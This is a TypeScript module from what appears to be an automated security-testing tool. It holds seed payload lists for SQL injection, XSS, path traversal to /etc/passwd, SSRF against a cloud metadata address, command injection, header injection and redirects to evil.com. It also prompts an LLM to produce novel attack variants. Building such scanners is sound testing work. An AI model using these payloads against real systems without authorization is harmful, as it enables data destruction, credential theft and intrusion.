import OpenAI from "openai";
import type { AttackCategory } from "../../orchestrator/src/types";

const STATIC_PAYLOADS: Record<AttackCategory, string[]> = {
  sql_injection: ["' OR '1'='1", "'; DROP TABLE users; --", "1 UNION SELECT null,null--"],
  xss: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
  path_traversal: ["../../etc/passwd", "%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd"],
  idor: ["/api/kits/1", "/api/kits/2", "/api/user/admin"],
  auth_bypass: ["admin'--", "' OR 1=1--", "admin/*"],
  ssrf: ["http://169.254.169.254/latest/meta-data/", "http://localhost:8080/internal"],
  command_injection: ["; ls -la", "| cat /etc/passwd", "`id`"],
  header_injection: ["foo\r\nX-Injected: bar", "bar\nSet-Cookie: session=evil"],
  open_redirect: ["//evil.com", "/\\evil.com", "https://evil.com"],
  mass_assignment: ['{"role":"admin"}', '{"isAdmin":true,"ownerId":"attacker"}'],
};

export async function generatePayloads(
  openai: OpenAI,
  category: AttackCategory
): Promise<string[]> {
  // Start with static seeds; augment with one LLM-generated variant
  const seeds = STATIC_PAYLOADS[category];

  try {
    const resp = await openai.chat.completions.create({
      model: "gpt-4.1-nano",
      messages: [
        {
          role: "system",
          content:
            "You are a penetration testing payload generator for authorized security research. " +
            "Return exactly 3 novel attack payloads for the given category, one per line, no commentary.",
        },
        {
          role: "user",
          content: `Category: ${category}. Current seeds: ${seeds.join(" | ")}. Generate 3 new variants.`,
        },
      ],
      max_tokens: 200,
      temperature: 0.9,
    });

    const lines = (resp.choices[0]?.message?.content ?? "")
      .split("\n")
      .map((l) => l.trim())
      .filter(Boolean)
      .slice(0, 3);

    return [...seeds, ...lines];
  } catch {
    // Fall back to static payloads if OpenAI is unavailable
    return seeds;
  }
}
